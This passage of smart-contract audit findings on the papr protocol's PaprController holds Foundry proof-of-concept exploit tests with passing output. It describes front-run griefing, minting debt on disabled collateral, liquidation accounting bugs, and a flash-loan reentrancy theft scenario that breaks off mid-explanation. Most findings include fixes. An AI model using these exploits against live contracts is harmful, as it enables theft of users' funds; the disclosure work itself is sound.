3; i ++) { +            nft.mint(purchaser, 10+i); +            nft.safeTransferFrom(purchaser, address(controller), 10+i, abi.encode(safeTransferReceivedArgs)); +        } +        vm.stopPrank(); +        // purchaser now has 4.4... papr +        assertGt(debtToken.balanceOf(purchaser), 4.4e18); + +        // make max loan liquidatable +        vm.warp(block.timestamp + 1 days); +        priceKind = ReservoirOracleUnderwriter.PriceKind.TWAP; +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +    } + +    function testPoC() public { +        vm.startPrank(purchaser); +        debtToken.approve(address(controller), type(uint256).max); + +        // start auction1, collateralId +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        auction1 = controller.startLiquidationAuction(borrower, collateral, oracleInfo); + +        // nobody purchage auction1 for some reason(like nft price falling) + +        // start auction2, collateralId+1 +        vm.warp(block.timestamp + controller.liquidationAuctionMinSpacing()); +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        auction2 = controller.startLiquidationAuction( +            borrower, IPaprController.Collateral({id: collateralId+1, addr: nft}),  oracleInfo); + +        IPaprController.VaultInfo memory info = controller.vaultInfo(borrower, collateral.addr); +        assertGt(info.debt, 2.99e18); + +        // purchase auction1 +        uint256 beforeBalance = debtToken.balanceOf(borrower); +        uint256 price = controller.auctionCurrentPrice(auction1); +        uint256 penalty = price * controller.liquidationPenaltyBips() / 1e4; +        uint256 reduced = price - penalty; +        uint256 shortfall = info.debt - reduced; +        // burn penalty +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), address(0), penalty); +        // reduce debt (partial) +        vm.expectEmit(true, false, false, true); +        emit ReduceDebt(borrower, collateral.addr, reduced); +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), address(0), reduced); +        //!! burning the shortfall debt not covered by auction +        vm.expectEmit(true, false, false, true); +        emit ReduceDebt(borrower, collateral.addr, shortfall); +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        controller.purchaseLiquidationAuctionNFT(auction1, price, purchaser, oracleInfo); + +        // reduced: 0.65.. +        assertLt(reduced, 0.66e18); +        // fortfall: 2.34.. +        assertGt(shortfall, 2.34e18); +        //!! debt is 0 now +        info = controller.vaultInfo(borrower, collateral.addr); +        assertEq(info.debt, 0); + +        // purchase auction2 +        // https://www.wolframalpha.com/input?i=solve+3+%3D+8.999+*+0.3+%5E+%28x+%2F+86400%29 +        vm.warp(block.timestamp + 78831); +        beforeBalance = debtToken.balanceOf(borrower); +        price = controller.auctionCurrentPrice(auction2); +        penalty = price * controller.liquidationPenaltyBips() / 1e4; +        uint256 payouts = price - penalty; +        // burn penalty +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), address(0), penalty); +        //!! reduce 0 because debt is 0 +        vm.expectEmit(true, false, false, true); +        emit ReduceDebt(borrower, collateral.addr, 0); +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), address(0), 0); +        //!! borrower get the payouts that should be used to reduce the shortfall debt +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), borrower, payouts); +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        controller.purchaseLiquidationAuctionNFT(auction2, price, purchaser, oracleInfo); + +        //!! borrower wins +        uint256 afterBalance = debtToken.balanceOf(borrower); +        assertEq(afterBalance - beforeBalance, payouts); +        assertGt(payouts, 2.4e18); +    } + +    function _addCollaterals() internal { +        vm.startPrank(borrower); +        nft.setApprovalForAll(address(controller), true); +        IPaprController.Collateral[] memory c = new IPaprController.Collateral[](2); +        c[0] = collateral; +        c[1] = IPaprController.Collateral({id: collateralId+1, addr: nft}); +        controller.addCollateral(c); +        vm.stopPrank(); +    } + +    function _loanMaxAndSell() internal { +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        IPaprController.SwapParams memory swapParams = IPaprController.SwapParams({ +            amount: controller.maxDebt(oraclePrice*2) - 4, +            minOut: 1, +            sqrtPriceLimitX96: _maxSqrtPriceLimit({sellingPAPR: true}), +            swapFeeTo: address(0), +            swapFeeBips: 0 +        }); +        vm.prank(borrower); +        controller.increaseDebtAndSell(borrower, collateral.addr, swapParams, oracleInfo); +    } +} ```  Test output: ``` Running 1 test for test/paprController/PoC.sol:PoC [PASS] testPoC() (gas: 720941) Test result: ok. 1 passed; 0 failed; finished in 1.21s ```  ## Tools Used VS Code  ## Recommended Mitigation Steps  The debt shortfall should be recorded and accumulated when the debt is burnt directly. Fill the shortfall first in later liquidation.  Implementation code: ```solidity diff --git a/src/PaprController.sol b/src/PaprController.sol index 284b3f4..d7e4cea 100644 --- a/src/PaprController.sol +++ b/src/PaprController.sol @@ -61,6 +61,8 @@ contract PaprController is       /// @dev account => asset => vaultInfo      mapping(address => mapping(ERC721 => IPaprController.VaultInfo)) private _vaultInfo; +    /// @dev account => asset => shortfall amount +    mapping(address => mapping(ERC721 => uint256)) private _shortfall;       /// @dev does not validate args      /// e.g. does not check whether underlying or oracleSigner are address(0) @@ -288,6 +290,8 @@ contract PaprController is          }           if (isLastCollateral && remaining != 0) { +            // increase shortfall +            _shortfall[auction.nftOwner][auction.auctionAssetContract] += remaining;              /// there will be debt left with no NFTs, set it to 0              _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);          } @@ -408,6 +412,10 @@ contract PaprController is          return _vaultInfo[account][asset];      }  +    function shortfall(address account, ERC721 asset) external view returns (uint256) { +        return _shortfall[account][asset]; +    } +      /// INTERNAL NON-VIEW ///       function _addCollateralToVault(address account, IPaprController.Collateral memory collateral) internal { @@ -543,7 +551,20 @@ contract PaprController is              // we owe them more papr than they have in debt              // so we pay down debt and send them the rest              _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), debtCached); -            papr.transfer(auction.nftOwner, totalOwed - debtCached); + +            uint256 payout = totalOwed - debtCached; +            uint256 burnShortfall = _shortfall[auction.nftOwner][auction.auctionAssetContract]; +            if (burnShortfall >= payout) { +                burnShortfall = payout; +            } +            if (burnShortfall > 0) { +                // burn the previous shortfall +                PaprToken(address(papr)).burn(address(this), burnShortfall); +                _shortfall[auction.nftOwner][auction.auctionAssetContract] -= burnShortfall; +            } +            if (payout > burnShortfall) { +                papr.transfer(auction.nftOwner, payout - burnShortfall); +            }          } else {              // reduce vault debt              _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), totalOwed); ``` 
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486   # Vulnerability details  ## Impact  An attacker can apply grieving attack by preventing users from interacting with some of the protocol functions. In other words whenever a user is going to reduce his debt, or buy and reduce his debt in one tx, it can be failed by the attacker.  ## Proof of Concept In the following scenario, I am explaining how it is possible to fail user's transaction to reduce their debt fully. Failing other transaction (buy and reduce the debt in one tx) can be done similarly.   - Suppose Alice (an honest user) has debt of 1000 `PaprToken` and she intends to repay her debt fully:   - So, she calls the function `reduceDebt` with the following parameters:    - `account`: Alice's address    - `asset`: The NFT which was used as collateral    - `amount`: 1000 * 10**18 (decimal of `PaprToken` is 18). ``` function reduceDebt(address account, ERC721 asset, uint256 amount) external override {         _reduceDebt({account: account, asset: asset, burnFrom: msg.sender, amount: amount});     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L148  - Bob (a malicious user who owns a small amount of `PaprToken`) notices Alice's transaction in the Mempool. So, Bob applies front-run attack and calls the function `reduceDebt` with the following parameters:    - `account`: Alice's address    - `asset`: The NFT which was used as collateral    - `amount`: 1  - By doing so, Bob repays only **1** `PaprToken` on behalf of Alice, so Alice's debt becomes `1000 * 10**18 - 1`. ``` function _reduceDebt(address account, ERC721 asset, address burnFrom, uint256 amount) internal {         _reduceDebtWithoutBurn(account, asset, amount);         PaprToken(address(papr)).burn(burnFrom, amount);     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L481 ``` function _reduceDebtWithoutBurn(address account, ERC721 asset, uint256 amount) internal {         _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount);         emit ReduceDebt(account, asset, amount);     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486  - Then, when Alice's transaction is going to be executed, it fails because of `Underflow Error`. Since Alice's debt is `1000 * 10**18 - 1` while Alice's transaction was going to repay `1000 * 10**18`. ``` _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount); ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L487  - Bob only pays a very small value of 1 `PaprToken` (consider that the decimal is 18) to apply this grieving attack.  - Bob can repeat this attack for Alice, if Alice is going to call this function again with correct parameter.  ***In summary, Bob could prevent the user from paying her debt fully by just repaying a very small amount of the user's debt in advance and as a result causing underflow error. Bob can apply this attack for all other users who are going to repay their debt fully. Please note that if a user is going to repay her debt partially, the attack can be expensive and not financially reasonable, but in case of full repayment of debt, it is very cheap to apply this grieving attack.***  ***This attack can be applied on the transactions that are going to interact with the function `_reduceDebt`. The transactions interacting with this specific function are:***  - `buyAndReduceDebt(...)` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L229  - `reduceDebt(...)` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L149  ***It means that the attacker can prevent users from calling the functions above.***  ## Tools Used  ## Recommended Mitigation Steps The following condition should be added to the function `_reduceDebtWithoutBurn`: ``` function _reduceDebtWithoutBurn(address account, ERC721 asset, uint256 amount) internal {         if(amount > _vaultInfo[account][asset].debt){             amount = _vaultInfo[account][asset].debt;         }         _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount);         emit ReduceDebt(account, asset, amount);     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L365 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138   # Vulnerability details  ## Impact  Disabled collateral can still be used to mint debt  ## Proof of Concept  There is a access control function in PaprController.sol  ```solidity /// @inheritdoc IPaprController function setAllowedCollateral(IPaprController.CollateralAllowedConfig[] calldata collateralConfigs)  external  override  onlyOwner { ```  According to IPaprController, if the collateral is disabled set to false, the user should not be allowed to mint debt using the collateral,  ```solidity /// @notice sets whether a collateral is allowed to be used to mint debt /// @dev owner function /// @param collateralConfigs configuration settings indicating whether a collateral is allowed or not function setAllowedCollateral(IPaprController.CollateralAllowedConfig[] calldata collateralConfigs) external; ```  However, the code only checks if the collateral is allowed when adding collateral,   ```solidity function _addCollateralToVault(address account, IPaprController.Collateral memory collateral) internal {  if (!isAllowed[address(collateral.addr)]) {   revert IPaprController.InvalidCollateral();  } ```  but does not have the same check when minting debt, then user can use diabled collateral to mint debt.  ```solidity function _increaseDebt(  address account,  ERC721 asset,  address mintTo,  uint256 amount,  ReservoirOracleUnderwriter.OracleInfo memory oracleInfo ) internal {  uint256 cachedTarget = updateTarget();   uint256 newDebt = _vaultInfo[account][asset].debt + amount;  uint256 oraclePrice =   underwritePriceForCollateral(asset, ReservoirOracleUnderwriter.PriceKind.LOWER, oracleInfo);   uint256 max = _maxDebt(_vaultInfo[account][asset].count * oraclePrice, cachedTarget);   if (newDebt > max) revert IPaprController.ExceedsMaxDebt(newDebt, max);   if (newDebt >= 1 << 200) revert IPaprController.DebtAmountExceedsUint200();   _vaultInfo[account][asset].debt = uint200(newDebt);  PaprToken(address(papr)).mint(mintTo, amount);   emit IncreaseDebt(account, asset, amount); } ```  As shown in the coded POC  We can add the following test to increaseDebt.t.sol  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/IncreaseDebt.t.sol#L32  ```solidity function testIncreaseDebt_POC() public {   uint256 debt = 10 ether;  // console.log(debt);   vm.assume(debt < type(uint200).max);  vm.assume(debt < type(uint256).max / controller.maxLTV() / 2);   oraclePrice = debt * 2;  oracleInfo = _getOracleInfoForCollateral(nft, underlying);    vm.startPrank(borrower);  nft.approve(address(controller), collateralId);  IPaprController.Collateral[] memory c = new IPaprController.Collateral[](1);  c[0] = collateral;   controller.addCollateral(c);   // disable the collateral but still able to mint debt  IPaprController.CollateralAllowedConfig[] memory args = new IPaprController.CollateralAllowedConfig[](1);  args[0] = IPaprController.CollateralAllowedConfig({   collateral: address(collateral.addr),   allowed: false  });   vm.stopPrank();   vm.prank(controller.owner());  controller.setAllowedCollateral(args);   vm.startPrank(borrower);   controller.increaseDebt(borrower, collateral.addr, debt, oracleInfo);  assertEq(debtToken.balanceOf(borrower), debt);  assertEq(debt, controller.vaultInfo(borrower, collateral.addr).debt); } ```  We disable the collateral but still able to mint debt by calling increaseDebt  We run the test   ```solidity forge test -vvv --match testIncreaseDebt_POC ```  The test pass, but the test should revert.  ``` Running 1 test for test/paprController/IncreaseDebt.t.sol:IncreaseDebtTest [PASS] testIncreaseDebt_POC() (gas: 239301) Test result: ok. 1 passed; 0 failed; finished in 237.42ms ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend the project add check to make sure when the collateral is disabled, the collateral should not be used to mint debt  ```solidity if (!isAllowed[address(collateral.addr)]) {  revert IPaprController.InvalidCollateral(); } ```
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264-L294   # Vulnerability details  ## Impact Function `purchaseLiquidationAuctionNFT()` purchases a liquidation auction with the controller's papr token. the liquidator pays the papr amount which is equal to price of the auction and receives the auctioned  NFT. contract would transfer paid papr and  pay borrower debt and if there is extra papr left it would be transferred to the user. for extra papr that is not required for brining user debt under max debt, contract gets liquidation penalty but in some cases (when the auctioned NFT is user's last collateral) contract take penalty from all of the transferred papr and not just the extra. so users would lose funds in those situations because of this and the fund could be big because the penalty is 10% of the price of the auction and in most cases user would lose 10% of his debt (the value of the NFT).  ## Proof of Concept This is `purchaseLiquidationAuctionNFT()` code: ```     function purchaseLiquidationAuctionNFT(         Auction calldata auction,         uint256 maxPrice,         address sendTo,         ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo     ) external override {         uint256 collateralValueCached = underwritePriceForCollateral(             auction.auctionAssetContract, ReservoirOracleUnderwriter.PriceKind.TWAP, oracleInfo         ) * _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count;         bool isLastCollateral = collateralValueCached == 0;          uint256 debtCached = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].debt;         uint256 maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget());         /// anything above what is needed to bring this vault under maxDebt is considered excess         uint256 neededToSaveVault = maxDebtCached > debtCached ? 0 : debtCached - maxDebtCached;         uint256 price = _purchaseNFTAndUpdateVaultIfNeeded(auction, maxPrice, sendTo);         uint256 excess = price > neededToSaveVault ? price - neededToSaveVault : 0;         uint256 remaining;          if (excess > 0) {             remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);         } else {             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), price);             remaining = debtCached - price;         }          if (isLastCollateral && remaining != 0) {             /// there will be debt left with no NFTs, set it to 0             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);         }     } ``` As you can see when `collateralValueCached` is 0 and user has no more collaterals left then the value of `isLastCollateral` set as true. and when `isLastCollateral` is true the value of `maxDebtCached` set as `debtCached` (line `maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget());`) and the value of the `neededToSaveVault` would be 0 (line `neededToSaveVault = maxDebtCached > debtCached ? 0 : debtCached - maxDebtCached`) and the `excess` would be equal to `price` (in the line `excess = price > neededToSaveVault ? price - neededToSaveVault : 0`) so all the papr paid by liquidator would considered as excess and contract would get liquidation penalty out of that. so: in current implementation in last collateral liquidation all of the paid papr by liquidator would be considered excess: 1. user has no NFT left. 2. debtCached is 100. 3. collateralValueCached  is 0 and isLastCollateral is true. 4. maxDebtCached would be as debtCached which is 100. 5. neededToSaveVault would be debtCached - maxDebtCached which is 0. 6. excess would equal to price and code would take penalty out of all the price amount.  code wants to take penalty from what borrower is going to receive(other than the required amount for extra debt), but in the current implementation when it is last NFT code took fee from all of the payment. these are the steps shows how issue would harm the borrower and borrower would lose funds: (of course user debt would be set to 0 in the end, but if price was higher than user debt user won't receive the extra amount) 1. user debt is 900 and price of auction is 1000 and user has no NFT left. 2. some one pays 1000 Papr and buys the auctioned token, now user would receive 0 amount because the penalty would be 1000 * 10% = 100 and the debt is 900. 3. but penalty should be (1000-900) * 10% = 10 and user should have received 90 token.  so users would receive less amount when their last NFT is liquidated and the price is higher than debt. users would lose 10% of the their intitled fund. most users can use one token as collateral so the bug can happen most of the time.  ## Tools Used VIM  ## Recommended Mitigation Steps the code should be like this: ``` uint256 maxDebtCached = isLastCollateral ? 0: _maxDebt(collateralValueCached, updateTarget()); ```
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L273   # Vulnerability details  ## Impact  Liquidation might work incorrectly  ## Proof of Concept  There is a function `purchaseLiquidationAuctionNFT()` to allow liquidators to purchase NFTs on auction. In the line 273, the protocol checks if the current NFT is the last collateral using the `collateralValueCached`. But it might be possible for Reservoir Oracle to return zero (for whatever reason) and in that case `collateralValueCached` will be zero even when the `_vaultInfo[auction.nftOwner][auction.auctionAssetContract].count!=0`. One might argue that it is impossible for the Reservoir oracle to return zero output but I think it is safe not to rely on it.  ```solidity PaprController.sol 264:     function purchaseLiquidationAuctionNFT( 265:         Auction calldata auction, 266:         uint256 maxPrice, 267:         address sendTo, 268:         ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo 269:     ) external override { 270:         uint256 collateralValueCached = underwritePriceForCollateral( 271:             auction.auctionAssetContract, ReservoirOracleUnderwriter.PriceKind.TWAP, oracleInfo 272:         ) * _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count; 273:         bool isLastCollateral = collateralValueCached == 0;//@audit not safe 274: 275:         uint256 debtCached = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].debt; 276:         uint256 maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget()); 277:         /// anything above what is needed to bring this vault under maxDebt is considered excess 278:         uint256 neededToSaveVault = maxDebtCached > debtCached ? 0 : debtCached - maxDebtCached; 279:         uint256 price = _purchaseNFTAndUpdateVaultIfNeeded(auction, maxPrice, sendTo);time 280:         uint256 excess = price > neededToSaveVault ? price - neededToSaveVault : 0; 281:         uint256 remaining; 282: 283:         if (excess > 0) { 284:             remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction); 285:         } else { 286:             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), price); 287:             remaining = debtCached - price; 288:         } 289: 290:         if (isLastCollateral && remaining != 0) { 291:             /// there will be debt left with no NFTs, set it to 0 292:             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining); 293:         } 294:     } 295:  ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Change the line 273 as below.  ```soliditiy bool isLastCollateral = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count == 0; ```
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61   # Vulnerability details  ## Impact The `PaprController.buyAndReduceDebt` function ([https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232)) should work like this:   1. `msg.sender` swaps some amount of the underlying token for papr token 2. This amount of papr token is used to repay debt for the address in the `account` parameter  `msg.sender` and `account` can be different addresses such that one can repay anyone's debt.    However there is a mistake in the function which leads to this behavior:   1. `msg.sender` swaps some amount of the underlying token for papr token 2. The papr token is sent to the `account` address 3. The papr token is burnt from the `msg.sender` 4. The amount of papr token burnt from the `msg.sender` is used to pay back the debt of the `account` address  The issue is that the swapped papr token are sent to `account` but the papr token are burnt from `msg.sender`.    In the best scenario when calling this function, the msg.sender does not have enough papr token to burn so the function call reverts.    In the scenario that is worse, the `msg.sender` has enough papr token to be burnt.   So the `account` address receives the swapped papr token and the debt of `account` is paid as well by the `msg.sender`.    Thereby the `msg.sender` pays double the amount he wants to.   Once by swapping his underlying tokens for papr.   The second time because his papr token are burnt.    ## Proof of Concept The `PaprController.buyAndReduceDebt` function ([https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232)) calls `UniswapHelpers.swap` ([https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61)):   ```solidity (uint256 amountOut, uint256 amountIn) = UniswapHelpers.swap(     pool,     account,     token0IsUnderlying,     params.amount,     params.minOut,     params.sqrtPriceLimitX96,     abi.encode(msg.sender) ); ``` The second parameter which has the value `account` is the recipient of the swap.   The last parameter which is `msg.sender` is the address paying the input amount for the swap.    So the `msg.sender` pays some amount of underlying and the papr that the underlying is swapped for is sent to the `account`.    But then the debt of `account` is reduced by burning papr token from `msg.sender`:   ```solidity _reduceDebt({account: account, asset: collateralAsset, burnFrom: msg.sender, amount: amountOut}); ``` However the papr token from the swap were received by `account`. So the `msg.sender` pays twice and `account` receives twice.    ## Tools Used VSCode  ## Recommended Mitigation Steps The swapped papr token should be sent to the `msg.sender` instead of `account` such that they can then be burnt from `msg.sender`.    In order to achieve this, a single line in `PaprController.buyAndReduceDebt` must be changed:    ```solidity          (uint256 amountOut, uint256 amountIn) = UniswapHelpers.swap(              pool, -            account, +            msg.sender,              token0IsUnderlying,              params.amount,              params.minOut,              params.sqrtPriceLimitX96,             abi.encode(msg.sender)         ); ```
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L159   # Vulnerability details  ## Impact Users will lose collateral NFTs when they are transferred to `PaprController` by an approved address or an operator. ## Proof of Concept The `PaprController` allows users to deposit NFTs as collateral to borrow Papr tokens. One of the way of depositing is by transferring an NFT to the contract directly via a call to `safeTransferFrom`: the contract implements the `onERC721Received` hook that will handle accounting of the transferred NFT ([PaprController.sol#L159](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L159)). However, the hook implementation uses a wrong argument to identify token owner: the first argument, which is used by the contract to identify token owner, is the address of the `safeTransferFrom` function caller, which may be an approved address or an operator. The actual owner address is the second argument ([ERC721.sol#L436](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436)): ```solidity try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) { ```  Thus, when an NFT is sent by an approved address or an operator, it'll be deposited to the vault of the approved address or operator: ```solidity // test/paprController/OnERC721ReceivedTest.sol  function testSafeTransferByOperator_AUDIT() public {     address operator = address(0x12345);      vm.prank(borrower);     nft.setApprovalForAll(operator, true);      vm.prank(operator);     nft.safeTransferFrom(borrower, address(controller), collateralId, abi.encode(safeTransferReceivedArgs));      // NFT was deposited to the operator's vault.     IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(operator, collateral.addr);     assertEq(vaultInfo.count, 1);      // Borrower has 0 tokens in collateral.     vaultInfo = controller.vaultInfo(borrower, collateral.addr);     assertEq(vaultInfo.count, 0); }  function testSafeTransferByApproved_AUDIT() public {     address approved = address(0x12345);      vm.prank(borrower);     nft.approve(approved, collateralId);      vm.prank(approved);     nft.safeTransferFrom(borrower, address(controller), collateralId, abi.encode(safeTransferReceivedArgs));      // NFT was deposited to the approved address's vault.     IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(approved, collateral.addr);     assertEq(vaultInfo.count, 1);      // Borrower has 0 tokens in collateral.     vaultInfo = controller.vaultInfo(borrower, collateral.addr);     assertEq(vaultInfo.count, 0); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps Consider this change: ```diff --- a/src/PaprController.sol +++ b/src/PaprController.sol @@ -156,7 +156,7 @@ contract PaprController is      /// @param _id the id of the NFT      /// @param data encoded IPaprController.OnERC721ReceivedArgs      /// @return selector indicating succesful receiving of the NFT -    function onERC721Received(address from, address, uint256 _id, bytes calldata data) +    function onERC721Received(address, address from, uint256 _id, bytes calldata data)          external          override          returns (bytes4) ```
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L382-L384   # Vulnerability details  ## Impact Because the Papr Controller never gives approval for ERC20 transfers, calls to `safeTransferFrom` on the Papr token will revert with insufficient approval. This will trap proceeds from auctions in the contract and prevent the owner/ DAO from collecting fees, motivating the rating of high severity. The root cause of this issue is misusing `safeTransferFrom` to transfer tokens directly out of the contract instead of using `transfer` directly. The contract will hold the token balance and thus does not need approval to transfer tokens, nor can it approve token transfers in the current implementation.  ## Proof of Concept Comment out [this token approval](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/OwnerFunctions.ft.sol#L67) as the controller contract does not implement functionality to call approve. It doesn't make sense to "prank" a contract account in this context because it deviates from the runtime behavior of the deployed contract. That is, it's impossible for the Papr Controller to approve token transfers. Run `forge test -m testSendPaprFromAuctionFeesWorksIfOwner` and observe that it fails because of insufficient approvals. Replace [the call to `safeTransferFrom`](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L383) with a call to `transfer(to, amount)` and rerun the test. It will now pass and correctly achieve the intended behavior.   ## Tools Used  Foundry  ## Recommended Mitigation Steps Call `transfer(to, amount)` instead of `safeTrasferFrom` [here](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L383). Note, it's unnecessary to use `safeTransfer` as the Papr token doesn't behave irregularly.
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444   # Vulnerability details  ## Impact  By applying reentrancy attack involving the functions `removeCollateral`, `startLiquidationAuction`, and `purchaseLiquidationAuctionNFT`, an Attacker can steal large amount of fund.  ## Proof of Concept   - Bob (a malicious user) deploys a contract to apply the attack. This contract is called `BobContract`. Please note that all the following transactions are going to be done in one transaction.  - BobContract takes a flash loan of 500K USDC.  - BobContract buys 10 NFTs with ids 1 to 10 from collection which are allowed to be used as collateral in this project. Suppose, each NFT has price of almost 50k USDC.  - BobContract adds those NFTs as collateral by calling the function `addCollateral`. So `_vaultInfo[BobContract][collateral.addr].count = 10`. ``` function addCollateral(IPaprController.Collateral[] calldata collateralArr) external override {         for (uint256 i = 0; i < collateralArr.length;) {             _addCollateralToVault(msg.sender, collateralArr[i]);             collateralArr[i].addr.transferFrom(msg.sender, address(this), collateralArr[i].id);             unchecked {                 ++i;             }         }     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L98  - BobContract borrows the max allowed amount of `PaprToken` that is almost equivalent to 250k USDC (for simplicity I am assuming target price and mark price are equal to 1 USDC. This assumption does not change the attack scenario at all. It is only to simplify the explanation). This amount is equal to 50% of the collateral amount. It can be done by calling the function `increaseDebt`.  ``` function maxDebt(uint256 totalCollateraValue) external view override returns (uint256) {         if (_lastUpdated == block.timestamp) {             return _maxDebt(totalCollateraValue, _target);         }          return _maxDebt(totalCollateraValue, newTarget());     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L393 ``` function _maxDebt(uint256 totalCollateraValue, uint256 cachedTarget) internal view returns (uint256) {         uint256 maxLoanUnderlying = totalCollateraValue * maxLTV;         return maxLoanUnderlying / cachedTarget;     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556 ``` function increaseDebt(         address mintTo,         ERC721 asset,         uint256 amount,         ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo     ) external override {         _increaseDebt({account: msg.sender, asset: asset, mintTo: mintTo, amount: amount, oracleInfo: oracleInfo});     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138  - BobContract now has 10 NFTs as collateral (worth 500k) and borrowed 10*50k*50% = 250k.  - BobContract intends to call the function `removeCollateral`. (In the normal way of working with the protocol, this is not allowed, because by removing even 1 NFT, the debt 250k becomes larger than max allowed collateral 9*50k*50%). https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L109  - Here is the trick. BobContract calls this function to remove the NFT with id 1. During the removal in the function `_removeCollateral`, the `safeTransferFrom` callbacks the BobContract. 